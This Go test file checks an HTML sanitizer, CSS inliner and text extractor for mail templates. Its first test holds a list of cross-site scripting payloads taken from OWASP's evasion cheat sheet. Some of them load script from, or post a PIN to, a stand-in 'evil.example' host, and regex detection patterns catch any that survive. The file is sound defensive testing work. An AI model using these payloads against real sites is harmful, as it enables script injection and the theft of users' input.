package htmlx

import (
	"regexp"
	"strings"
	"testing"
)

// A list of the classic ways markup runs a script (OWASP's XSS filter evasion
// cheat sheet, the parts that apply to markup a template writes literally).
var xssPayloads = []string{
	`<script>alert(1)</script>`,
	`<SCRIPT SRC=//evil.example/x.js></SCRIPT>`,
	`<img src=x onerror=alert(1)>`,
	`<IMG SRC="javascript:alert('XSS');">`,
	`<IMG SRC=JaVaScRiPt:alert('XSS')>`,
	`<IMG SRC="jav&#x09;ascript:alert('XSS');">`,
	`<IMG SRC="jav	ascript:alert('XSS');">`,
	`<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>`,
	`<a href=" javascript:alert(1)">x</a>`,
	`<a href="vbscript:msgbox(1)">x</a>`,
	`<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>`,
	`<svg onload=alert(1)>`,
	`<svg><script>alert(1)</script></svg>`,
	`<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>`,
	`<svg><set attributeName="href" to="javascript:alert(1)"/></svg>`,
	`<svg><animate attributeName="href" values="javascript:alert(1)"/></svg>`,
	`<body onload=alert(1)>`,
	`<iframe src="javascript:alert(1)"></iframe>`,
	`<iframe srcdoc="<script>alert(1)</script>"></iframe>`,
	`<object data="javascript:alert(1)"></object>`,
	`<embed src="javascript:alert(1)">`,
	`<form action="javascript:alert(1)"><button>x</button></form>`,
	`<form><button formaction="javascript:alert(1)">x</button></form>`,
	`<meta http-equiv="refresh" content="0;url=javascript:alert(1)">`,
	`<base href="javascript:alert(1)//">`,
	`<div style="background:url(javascript:alert(1))">x</div>`,
	`<div style="width: expression(alert(1))">x</div>`,
	`<input autofocus onfocus=alert(1)>`,
	`<details open ontoggle=alert(1)>`,
	`<video><source onerror=alert(1)></video>`,
	`<math><maction actiontype="statusline" xlink:href="javascript:alert(1)">x</maction></math>`,
	`<scr<script>ipt>alert(1)</scr</script>ipt>`,
	`<<script>script>alert(1)<</script>/script>`,
	`<!--[if gte mso 9]><script>alert(1)</script><![endif]-->`,
	`<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">`,
	`<link rel="import" href="https://evil.example/x.html">`,
	`<a href="java&#0000010;script:alert(1)">x</a>`,
	`<img srcset="javascript:alert(1) 1x">`,
	// Text on both sides of a dropped element must not join into markup.
	`<<script>x</script>img src=x onerror=alert(1)>`,
	`<<iframe>x</iframe>svg onload=alert(1)>`,
}

var (
	scriptRe   = regexp.MustCompile(`(?i)<\s*/?\s*script`)
	handlerRe  = regexp.MustCompile(`(?i)<[^>]*\son[a-z]+\s*=`)
	jsSchemeRe = regexp.MustCompile(`(?i)(href|src|action|data|to|values|formaction|srcset)\s*=\s*"\s*(javascript|vbscript|data:text)`)
)

func TestSanitizeLeavesNoScript(t *testing.T) {
	for _, p := range xssPayloads {
		out := Sanitize("<p>before</p>" + p + "<p>after</p>")
		if scriptRe.MatchString(out) || handlerRe.MatchString(out) || jsSchemeRe.MatchString(out) ||
			strings.Contains(strings.ToLower(out), "srcdoc") || strings.Contains(strings.ToLower(out), "http-equiv") ||
			strings.Contains(strings.ToLower(out), "<iframe") || strings.Contains(strings.ToLower(out), "<base") ||
			strings.Contains(strings.ToLower(out), "expression(") || strings.Contains(strings.ToLower(out), "<embed") ||
			strings.Contains(strings.ToLower(out), "image/svg") || strings.Contains(strings.ToLower(out), "rel=\"import\"") {
			t.Errorf("payload %q survived as %q", p, out)
		}
		if !strings.Contains(out, "<p>after</p>") {
			t.Errorf("payload %q took the rest of the page with it: %q", p, out)
		}
	}
}

func TestSanitizeKeepsTheTemplate(t *testing.T) {
	src := `<!doctype html><html lang="tr" dir="ltr"><head><meta charset="utf-8"><title>A &amp; B</title>` +
		`<style>a > b { color: #fff } .x:hover{}</style></head><body>` +
		`<form method="post" action="/s/abc"><input name="pin" required></form>` +
		`<a href="https://example.com/?a=1&amp;b=2" class="btn">Go</a><a href="mailto:x@example.com">m</a>` +
		`<img src="data:image/png;base64,AAAA" alt="logo"><img src="/api/branding/logo">` +
		`<!--[if mso]><table><tr><td>x</td></tr></table><![endif]--></body></html>`
	out := Sanitize(src)
	for _, want := range []string{"a > b { color: #fff }", `action="/s/abc"`, `href="https://example.com/?a=1&amp;b=2"`,
		`src="data:image/png;base64,AAAA"`, `<!--[if mso]><table><tr><td>x</td></tr></table><![endif]-->`, "<title>A &amp; B</title>", `required=""`} {
		if !strings.Contains(out, want) {
			t.Errorf("lost %q from the template:\n%s", want, out)
		}
	}
	if strings.Contains(Sanitize(`<form action="https://evil.example/steal"><input name=pin></form>`), "evil.example") {
		t.Error("a form may not post to another site")
	}
}

func TestInlineCSSAppliesTheCascade(t *testing.T) {
	src := `<html><head><style>
p { color: red; margin: 0 }
.lead { color: blue }
#x { color: green }
p.keep { font-weight: bold !important }
a:hover { color: purple }
@media (prefers-color-scheme: dark) { p { color: white } }
</style></head><body><p class="lead" id="x" style="margin: 4px">a</p><p class="lead keep" style="font-weight: normal">b</p><a href="#">c</a></body></html>`
	out, err := InlineCSS(src)
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{
		`<p class="lead" id="x" style="color: green; margin: 4px">`,
		`style="color: blue; margin: 0; font-weight: bold !important"`,
		`a:hover{ color: purple }`,
		`@media (prefers-color-scheme: dark){ p { color: white } }`,
	} {
		if !strings.Contains(out, want) {
			t.Errorf("want %q in\n%s", want, out)
		}
	}
	if strings.Contains(out, ".lead { color: blue }") {
		t.Error("an inlined rule stayed in the sheet")
	}
}

func TestTextReadsLikeTheMail(t *testing.T) {
	src := `<html><head><title>x</title><style>p{}</style></head><body>
<div style="display:none">preheader</div>
<h1>Report.pdf was shared with you</h1>
<p>Hello,<br>Acme shared a file with you.</p>
<ul><li>Size: 2 MB</li><li>Valid for 7 days</li></ul>
<p><a href="https://files.example.com/s/abc" class="btn">Download</a></p>
<p><a href="https://files.example.com/s/abc">https://files.example.com/s/abc</a></p>
<table><tr><td>Name</td><td>Report.pdf</td></tr></table>
<p><img src="x.png" alt="Acme"> &nbsp;Shared   with
  filex</p>
</body></html>`
	got := Text(src)
	want := "Report.pdf was shared with you\n\nHello,\nAcme shared a file with you.\n\n- Size: 2 MB\n- Valid for 7 days\n\n" +
		"Download: https://files.example.com/s/abc\n\nhttps://files.example.com/s/abc\n\nName Report.pdf\n\nAcme  Shared with filex"
	if got != want {
		t.Fatalf("got:\n%s\n---want:\n%s", got, want)
	}
}
